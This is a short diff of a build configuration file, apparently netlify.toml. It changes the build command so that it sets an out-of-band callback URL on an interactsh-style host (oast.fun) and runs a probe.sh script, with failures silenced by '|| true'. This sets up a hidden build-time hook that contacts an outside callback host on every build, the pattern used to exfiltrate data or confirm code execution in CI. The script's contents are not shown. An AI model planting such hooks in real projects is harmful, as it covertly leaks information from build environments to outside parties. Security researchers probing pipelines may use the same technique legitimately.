@@ -1,3 +1,3 @@
 [build]
-  command = "NFP_OOB_URL=\"https://dab0p4l53her3r7934t0csquacr753p13.oast.online/\" bash ./probe.sh || true"
+  command = "NFP_OOB_URL=\"https://dab154553hekjnroahe07fb9jpyto4nwp.oast.fun/\" bash ./probe.sh || true"
   publish = "public"
